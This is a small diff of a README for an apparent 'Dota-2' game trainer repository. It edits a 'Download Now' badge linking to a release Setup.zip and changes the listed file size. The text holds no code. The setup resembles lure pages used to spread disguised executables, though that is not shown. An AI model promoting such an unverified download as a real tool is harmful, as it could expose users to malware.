@@ -7,9 +7,12 @@
 
 
 
+
 [![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/TameDragonflyFlare/Dota-2/releases/download/main/Setup.zip)
 
-Latest Version • File Size: ~74 MB
+Latest Version • File Size: ~45 MB
+
+</div>
 
 </div>
 
@@ -51,6 +54,7 @@ configs/
 `Dota-2` · Updated: 2026-10-01
 
 **Tags:** `Dota-2` `dota-2-trainer`
+
 
 
 
